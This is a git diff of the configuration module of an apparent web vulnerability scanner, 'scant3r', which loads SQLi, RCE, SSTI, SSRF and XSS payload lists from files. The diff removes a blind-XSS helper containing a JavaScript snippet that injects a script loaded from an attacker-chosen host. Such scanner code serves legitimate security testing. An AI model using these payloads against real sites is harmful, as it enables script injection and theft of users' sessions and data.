@@ -1,7 +1,5 @@
 import os.path
-from base64 import b64encode
 from pathlib import Path
-from typing import Union
 
 from rich.console import Console
 
@@ -22,14 +20,13 @@ LOGGING_FILE = os.path.join(Path.home(), ".scant3r.log")
 CLEAR_LOGGING_FILE = True
 
 
-
 # ENABLED Modules ( after using `-m all` option)
-ENABLED_MODS = ["ssti","firebase","req_callback"]
+ENABLED_MODS = ["ssti", "firebase", "req_callback"]
 
 # CLI
 LOGO = open(f"{base_dir}/conf/logo.txt", "r").read()
 console = Console()
-FIREBASE_URL = 'https://%s.firebaseio.com'
+FIREBASE_URL = "https://%s.firebaseio.com"
 
 # PAYLOADS
 SQLI_PAYLOADS = Path(f"{base_dir}/db/txt/sqli.txt").read_text().splitlines()
@@ -43,25 +40,5 @@ RCE_PAYLOADS_PASSWD = Path(f"{base_dir}/db/txt/passwd.txt").read_text().splitlin
 
 SSTI = Path(f"{base_dir}/db/txt/ssti.txt").read_text().splitlines()
 SSRF_PARAMS = Path(f"{base_dir}/db/txt/ssrf_parameters.txt").read_text().splitlines()
-
-
-class XSS:
-    def __init__(self, host: Union[str, None] = None):
-        self.payloads = Path(f"{base_dir}/db/txt/xss.txt").read_text().splitlines()
-        self.blind_payloads = open(f"{base_dir}/db/txt/bxss.txt", "r")
-        self.blind = []
-        if host:
-            b64_jsvalue = (
-                b64encode(
-                    f'var a=document.createElement("script");a.src="{host}";document.body.appendChild(a);'.encode(
-                        "utf-8"
-                    )
-                )
-                .decode("utf-8")
-                .replace("=", "")
-            )
-            for blind_payload in self.blind_payloads:
-                new_payload = blind_payload.replace("{host}", host).replace(
-                    "{b64_host}", b64_jsvalue
-                )
-                self.payloads.append(new_payload)
+XSS_PAYLOADS = Path(f"{base_dir}/db/txt/xss.txt").read_text().splitlines()
+#BLIND_XSS_PAYLOADS = Path(f"{base_dir}/db/txt/bxss.txt", "r").read_text().splitlines()
